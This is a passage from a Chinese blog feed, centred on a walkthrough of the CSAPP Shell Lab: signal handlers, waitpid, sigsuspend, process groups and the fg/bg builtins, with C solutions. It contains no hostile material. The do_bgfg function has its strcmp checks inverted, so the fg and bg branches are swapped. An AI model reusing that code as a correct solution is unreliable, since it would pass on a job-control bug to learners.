class="built_in">SP</span>&lt;T&gt;(<span class="keyword">new</span> <span class="built_in">T</span>(std::forward&lt;Args&gt;(args)...));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>TODO：<code>SP</code> 好像是在之前某次练习中定义的，但忘了在哪。</p></blockquote><h2 id="模板特例化（Specializations）">模板特例化（Specializations）</h2><ul><li>定义函数模板特例化：关键字<code>template</code>后面跟一个空尖括号对（<code>&lt;&gt;</code>）。</li><li><strong>特例化的本质是实例化一个模板，而不是重载它。特例化不影响函数匹配。</strong></li><li>模板及其特例化版本应该声明在同一个头文件中。所有同名模板的声明应该放在前面，然后是特例化版本。</li><li><strong>我们可以部分特例化类模板，但不能部分特例化函数模板。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP - Shell Lab 详解</title>
      <link href="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/"/>
      <url>/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="https://csapp.cs.cmu.edu/im/labs/shlab.tar"><em>Shell Lab</em></a> [Updated 7/28/03]  (<a href="http://csapp.cs.cmu.edu/3e/README-shlab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/shlab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/shlab-handout.tar">Self-Study Handout</a>)</p><blockquote><p>Students implement their own simple Unix shell program with job control, including the ctrl-c and ctrl-z keystrokes, fg, bg, and jobs commands. This is the students’ first introduction to application level concurrency, and gives them a clear idea of Unix process control, signals, and signal handling.</p></blockquote></li></ul><h1 id="前言">前言</h1><p>本篇博客将会详细介绍 CSAPP 之 ShellLab 的完成过程，实现一个简易（lou）的 shell。tsh 拥有以下功能：</p><ul><li>可以执行外部程序</li><li>支持四个内建命令，名称和功能为：<ul><li><code>quit</code>：退出终端</li><li><code>jobs</code>：列出所有后台作业</li><li><code>bg &lt;job&gt;</code>：继续在后台运行一个处于停止状态的后台作业，<code>&lt;job&gt;</code> 可以是 PID 或者 %JID 形式</li><li><code>fg &lt;job&gt;</code>：将一个处于运行或者停止状态的后台作业转移到前台继续运行</li></ul></li><li>按下 ctrl + c 终止前台作业</li><li>按下 ctrl + z 停止前台作业</li></ul><p>实验材料中已经写好了一些函数，只要求我们实现下列核心函数：</p><ul><li><code>eval</code>：解析并执行指令</li><li><code>builtin_cmd</code>：识别并执行内建指令</li><li><code>do_bgfg</code>：执行 <code>fg</code> 和 <code>bg</code> 指令</li><li><code>waitfg</code>：阻塞终端直至前台任务完成</li><li><code>sigchld_handler</code>：捕获 <code>SIGCHLD</code> 信号</li><li><code>sigint_handler</code>：捕获 <code>SIGINT</code> 信号</li><li><code>sigtstp_handler</code>：捕获 <code>SIGTSTP</code> 信号</li></ul><h2 id="理论知识检验">理论知识检验</h2><p><strong>Q1：wait是等待子进程终止，然后父进程去收割？</strong></p><p><strong>Q2：kill是父进程去杀死子进程？</strong></p><p>以上两个问题若回答yes，则说明很有必要再把书本或者slides学习一遍，此外 <code>man wait / man kill</code> 也会给出非常棒的手册（都推荐）。</p><h1 id="信号处理函数">信号处理函数</h1><h2 id="sigint-handler-和-sigtstp-handler">sigint_handler 和 sigtstp_handler</h2><p>这两个函数的主要任务，是在收到 shell 传来的信号时，将这个信号“转发”给在 shell 中运行的进程。这个过程很好办——先用 <code> fgpid</code> 获取前台进程（为啥只有前台进程嘞？因为 SIGTSTP 和 SIGINT 信号是只发给前台进程的）的 pid，之后走 kill 调用，<strong>向这个子进程组发对应的信号</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> old_errno = errno;</span><br><span class="line">  <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line">  <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">kill</span>(-pid, sig);</span><br><span class="line">  &#125;</span><br><span class="line">  errno = old_errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> old_errno = errno;</span><br><span class="line">  <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line">  <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">kill</span>(-pid, sig);</span><br><span class="line">  &#125;</span><br><span class="line">  errno = old_errno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Q3：为什么要 <code>kill(-pid, sig)</code> ?</strong></p><p>如果 shell fork 出来的子进程，没有再 fork 它自己的子进程的话，填 “pid” 没有任何问题；但是，如果它 fork 了的话（shell 就有孙进程了），这时候子进程和孙进程的 pid 是不一样的。填正的 pid，只能保证子进程能被结束；但是孙进程么……就没那么幸运了——它会“丧父”（变成孤儿进程），直到操作系统“收养”它。</p><blockquote><p>这里可以看出 kill 只是 send a signal to a process，并不一定是发送SIGKILL。</p><p>扩展：SIGKILL 无法被忽略或组织。</p></blockquote><p><strong>Q4：handler 中是否需要阻塞信号的接收？</strong></p><p>有隐式阻塞机制，无须显式调用 <code>sigprocmask</code> 。</p><p><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/image-20240227201624460.png" alt></p><p>扩展：根据 G2 需要在handler入口和离开时暂存并恢复 <code>errno</code>。</p><p>根据 G1，实际上不能应该是用Standard I/O函数，如<code>printf</code>，但既然 <code>sigquit_handler</code> 中使用 <code>printf</code>，那就默认我们也能用吧。</p><p><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/image-20240227195817939.png" alt></p><h2 id="sigchld-handler">sigchld_handler</h2><p>阅读代码注释，有2点要求需要注意：</p><ol><li><em>or stops because it received a SIGSTOP or SIGTSTP signal</em></li><li><em>but doesn’t wait for any other currently running children to terminate.</em></li></ol><p>可以 <code>man waitpid</code>，里面有些好东西：</p><p>All  of  these  system  calls  are  used  to wait for state changes in a child of the calling process, and obtain information about the child whose state has changed.  A state  change  is considered  to  be: the child terminated; the child was stopped by a signal; or the child was resumed by a signal.</p><blockquote><p>这里可以回答Q1: <code>wait for process to change state</code>，这里的改变状态不只是 <code>terminated</code> 。</p></blockquote><p>In the case of a terminated child, performing a wait allows the  system to release the resources associated with the child; if a wait is not performed, then the terminated child remains in a “zombie” state (see NOTES below).</p><p>If a child has already changed state, then these calls return immediately.   Otherwise,  they block  until  either  a child changes state or a signal handler interrupts the call (assuming that system calls are not automatically restarted using the SA_RESTART flag of sigaction(2)).</p><blockquote><p>这里指明了<strong>对于一个terminated child 也可以调用 wait</strong>，即可以<strong>子进程先term，父进程后wait</strong>。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> old_errno = errno;</span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="keyword">while</span> ((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status)) &#123;</span><br><span class="line">      <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) &#123;</span><br><span class="line">      <span class="type">int</span> jid = <span class="built_in">pid2jid</span>(pid);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid,</span><br><span class="line">             <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">      <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFSTOPPED</span>(status)) &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="type">job_t</span> *job = <span class="built_in">getjobpid</span>(jobs, pid);</span><br><span class="line">      job-&gt;state = ST;</span><br><span class="line">      <span class="type">int</span> jid = <span class="built_in">pid2jid</span>(pid);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) Stopped by signal %d\n&quot;</span>, jid, pid,</span><br><span class="line">             <span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项含义：</p><ul><li><code>WNOHANG</code>： return immediately if no child has exited.</li><li><code>WUNTRACED</code>：also  return if a child has stopped (but not traced via ptrace(2)).  Status for traced children which have stopped is provided even if this option is not specified.</li></ul><h1 id="eval-和-waitfg">eval 和 waitfg</h1><h2 id="eval">eval</h2><p><strong>Q5：由于shell不会终止，其fg子进程可以被正常reap，但是bg子进程怎么reap呢？</strong><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/image-20240227210442451.png" alt="image-20240227210442451"></p><p>解决方法就是 <code>detach</code>：<code> setpgid(0, 0);</code>。这样做<strong>还能解决其他问题</strong>：</p><p>当我们按下 Ctrl + C，给子进程发终止消息的时候，如果 shell 和子进程的进程组号相同，那么它和子进程都会收到 转发的 SIGINT 信号，之后一起终止。只要我们在子进程里重新设下 gpid，就能解决这个问题了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> *argv[MAXARGS];</span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">  <span class="type">sigset_t</span> mask_all, mask_one, prev_mask;</span><br><span class="line">  <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;mask_one);</span><br><span class="line">  <span class="built_in">sigaddset</span>(&amp;mask_one, SIGCHLD);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> bg = <span class="built_in">parseline</span>(cmdline, argv);</span><br><span class="line">  <span class="keyword">if</span> (!argv[<span class="number">0</span>]) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">builtin_cmd</span>(argv)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_one, &amp;prev_mask);</span><br><span class="line">  <span class="keyword">if</span> ((pid = <span class="built_in">Fork</span>()) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>);  <span class="comment">// NOTE</span></span><br><span class="line">    <span class="built_in">Execve</span>(argv[<span class="number">0</span>], argv, environ);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_one, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">addjob</span>(jobs, pid, (bg ? BG : FG), cmdline);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">    <span class="built_in">waitfg</span>(pid);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, <span class="built_in">pid2jid</span>(pid), pid, cmdline);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里还涉及一个利用 block / unblock 进行同步的问题（如果不加，则不能保证handler中 <code>deletejob</code> 会晚于父进程中的 <code>addjob</code> 执行），建议阅读slide理解此问题。</p></blockquote><p>其中 <code>Fork</code> 和 <code>Execve</code> 是CMU wrap过的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">Fork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">unix_error</span>(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__path, <span class="type">char</span> *<span class="type">const</span> *__argv, <span class="type">char</span> *<span class="type">const</span> *__envp)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="built_in">execve</span>(__path, __argv, __envp);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, __argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="waitfg">waitfg</h2><p>除了<code>sigsuspend</code>, 其他方法不太行：</p><p><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/image-20240227211145653.png" alt></p><p>（上图中的 <em>Program is correct, but very wasteful</em> 指的是 <code>while (!pid) ;</code>）</p><p><code>int sigsuspend(const sigset_t *mask)</code> 的描述如下：</p><p>sigsuspend()  temporarily  replaces the signal mask of the calling thread with the mask given<br>by mask and then suspends the thread until delivery of a signal whose action is to  invoke  a<br>signal handler or to terminate a process.</p><p>If  the  signal  terminates the process, then sigsuspend() does not return.  If the signal is<br>caught, then sigsuspend() returns after the signal handler returns, and the  signal  mask  is<br>restored to the state before the call to sigsuspend().</p><p>It  is not possible to block SIGKILL or SIGSTOP; specifying these signals in mask, has no effect on the thread’s signal mask.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">  <span class="type">sigset_t</span> mask;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgpid</span>(jobs) == pid) &#123;</span><br><span class="line">    <span class="built_in">sigsuspend</span>(&amp;mask);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="builtin-cmd-和-do-bgfg">builtin_cmd 和 do_bgfg</h1><h2 id="builtin-cmd">builtin_cmd</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> is_builtin = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    is_builtin = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> is_builtin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do-bgfg">do_bgfg</h2><p>进程状态转化如下：</p><p><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/2065884-20220522140018500-649890004.png" alt></p><p><strong>Q6：job是什么，怎么使用？</strong></p><p>实验手册中这样说：The child processes created as a result of interpreting a single command line are known collectively as a job. In general, a job can consist of multiple child processes connected by Unix pipes.</p><p><img src="/2024/01/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l5-shlab/image-20240227211707608.png" alt="image-20240227211707608"></p><p><strong>Q7：<code>fg %2</code> 对 <code>jid = 2</code> 的进程 / 进程组有何影响？</strong></p><p>对于 bg 命令，我们只是向目标进程发送 SIGCONT 信号，让它继续执行；对于 fg 命令呢，我们先判断目标进程是不是已经暂停了（如果是，就先启动它）—— <strong>我们也可以对 bg / fg 目标job所在进程组都发一个CONT信</strong>号。之后调用 waitfg 等待进程结束。注意哦，这里的 kill 函数的第一个参数也是要填负值的。</p><p>当用户与命令行交互时，<strong>通常只有一个 foreground process（而非 foreground process group）在运行，只用等待这个进程结束。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> *cmd = argv[<span class="number">0</span>];</span><br><span class="line">  <span class="type">char</span> *id = argv[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">job_t</span> *job;</span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, cmd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (id[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(job = <span class="built_in">getjobjid</span>(jobs, <span class="built_in">atoi</span>(&amp;id[<span class="number">1</span>])))) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>, id);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">atoi</span>(id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(job = <span class="built_in">getjobpid</span>(jobs, <span class="built_in">atoi</span>(id)))) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s: No such process\n&quot;</span>, id);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, cmd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">kill</span>(-job-&gt;pid, SIGCONT);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">    job-&gt;state = BG;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">    job-&gt;state = FG;</span><br><span class="line">    <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意 <code>kill(-job-&gt;pid, SIGCONT)</code> 和  <code>waitfg(job-&gt;pid)</code> 。</p><h1 id="参考资料">参考资料</h1><ol><li>【【深入理解计算机系统 实验4 CSAPP】Shell Lab 实现 CMU 详细讲解 shelllab】 <a href="https://www.bilibili.com/video/BV1EF411h791/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f">https://www.bilibili.com/video/BV1EF411h791/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f</a> （郭郭wg的讲解视频）</li><li>csapp-shlab 详解 - 独小雪的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/422490811">https://zhuanlan.zhihu.com/p/422490811</a> （通俗易懂）</li><li><a href="https://www.cnblogs.com/zhiyiYo/p/16297819.html">CSAPP 之 ShellLab 详解 - 之一Yo - 博客园 (cnblogs.com)</a> （简洁明了）</li><li><a href="https://www.cnblogs.com/zhiyiYo/p/16297819.html">CSAPP 之 ShellLab 详解 - 之一Yo - 博客园 (cnblogs.com)</a> （逐trace分析）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第15章 面向对象程序设计</title>
      <link href="/2023/12/11/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch15-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
      <url>/2023/12/11/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch15-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
      
